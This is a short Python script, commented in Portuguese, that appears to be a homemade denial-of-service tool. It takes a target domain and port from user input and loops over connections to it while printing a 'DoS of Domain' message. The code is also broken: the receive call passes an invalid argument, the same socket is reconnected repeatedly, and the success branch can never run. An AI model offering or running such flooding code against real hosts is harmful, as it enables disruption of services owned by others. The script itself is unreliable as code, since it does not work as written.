import socket 
#bebilhotecas

#variaves e inputs
alvo = input("Domain~# ")
port = int(input("Port of domain~# "))
dsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def conexao():
	dsoc.connect((alvo, port))
	pacotes_recebido = dsoc.recv((1024).decode)

try:
	#Estabelecendo varias conexoes
	while True:
		if conexao():
			print(f"\n\nDoS of Domain => {alvo} at Port ==> {port}")
except Exception as ERRO:
	print(f"\nERRO: {ERRO}")
